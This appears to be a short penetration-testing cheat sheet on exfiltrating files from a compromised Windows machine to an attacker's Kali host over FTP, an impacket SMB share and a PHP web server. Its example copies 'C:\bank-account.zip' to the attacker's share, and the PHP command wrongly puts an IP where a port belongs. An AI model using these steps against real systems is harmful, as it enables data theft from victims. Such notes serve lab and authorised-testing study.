## FTP Server
Host ftp server on your kali machine: `python3 -m pyftpdlib -p 21 --write`

Now using ftp on the compromised windows machine connect to your ftp server using anonymous access: `ftp <IP>`

Remember to use `binary` mode when transferring files.

## SMB Server
`impacket-smbserver tadi .`

- use `-smb2support` if machine is running smb version 2

on the windows machine run `net use \\<KALI IP>\tadi`

you can copy from windows machine using: `copy C:\bank-account.zip Z:\bank-account.zip` or cd into `Z:\` then `copy C:<PATH> .`

`Z:\` would be the name of the share that you opened

## PHP Server
If php is installed on the windows client, host a server and connect to it from your kali machine

`php -S 0.0.0.0:<IP>`